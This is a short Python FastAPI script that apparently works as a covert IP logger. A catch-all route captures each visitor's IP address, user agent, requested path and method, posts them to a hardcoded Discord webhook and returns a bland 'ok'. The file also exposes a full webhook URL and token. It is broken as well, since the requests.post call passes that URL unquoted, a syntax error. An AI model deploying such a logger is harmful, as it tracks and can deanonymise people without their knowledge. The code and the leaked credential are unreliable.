from fastapi import FastAPI, Request
import requests

app = FastAPI()

WEBHOOK_URL = "https://discord.com/api/webhooks/1489273954274119932/exL5TnsOQlbusCZFDdW7jQEN6Pr8y76nvGadZ2Co0r6wuwLFLHGJa66Vz5w1PoiBbdiE"

@app.api_route("/{path:path}", methods=["GET", "POST"])
async def handle_request(request: Request, path: str):
    try:
        ip = request.headers.get("x-forwarded-for", request.client.host)
        user_agent = request.headers.get("user-agent")

        data = {
            "ip": ip,
            "user_agent": user_agent,
            "path": path,
            "method": request.method
        }

        # send to webhook
        requests.post(https://discord.com/api/webhooks/1489273954274119932/exL5TnsOQlbusCZFDdW7jQEN6Pr8y76nvGadZ2Co0r6wuwLFLHGJa66Vz5w1PoiBbdiE, json=data)

        return {
            "status": "ok"
        }

    except Exception as e:
        return {"error": str(e)}
